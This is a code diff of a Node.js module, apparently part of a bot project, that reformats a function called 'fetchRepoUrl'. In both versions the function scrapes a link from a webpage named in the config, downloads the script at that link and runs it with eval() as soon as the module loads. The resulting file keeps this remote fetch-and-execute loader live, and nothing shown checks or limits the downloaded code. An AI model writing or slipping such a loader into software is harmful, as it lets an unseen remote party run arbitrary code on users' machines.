@@ -5,32 +5,28 @@ const cheerio = require('cheerio');
 const adams = require(__dirname + "/../config");
 
 async function fetchRepoUrl() {
-    try {
-        // Fetch the webpage URL from config.js
-        const response = await axios.get(adams.BWM_XMD);
-        const $ = cheerio.load(response.data);
+  try {
+    // Fetch the webpage URL from config.js
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        // Refine selector: Check for any <a> tag with href containing "REPO_URL"
-        const repoUrl = $('a[href*="REPO_URL"]').attr('href');
+    // Improved selector: Look for an <a> tag where the href contains "REPO_URL"
+    const repoUrl = $('a[href*="REPO_URL"]').attr('href');
 
-        // If not found, throw error
-        if (!repoUrl) {
-            throw new Error('REPO_URL link not found. Check the webpage structure.');
-        }
-
-        console.log('REPO_URL fetched successfully:', repoUrl);
-
-        // Fetch and execute the script from REPO_URL
-        const scriptResponse = await axios.get(repoUrl);
-        const scriptContent = scriptResponse.data;
-        console.log("Script loaded successfully");
-
-        // Execute the script
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error:', error.message);
-        // Add fallback logic here if needed
+    // If not found, throw an error
+    if (!repoUrl) {
+      throw new Error('REPO_URL not found. Check the webpage HTML structure.');
     }
+
+    console.log('REPO_URL fetched successfully:', repoUrl);
+
+    // Fetch and execute the script from REPO_URL
+    const scriptResponse = await axios.get(repoUrl);
+    eval(scriptResponse.data); // Execute the script
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchRepoUrl();
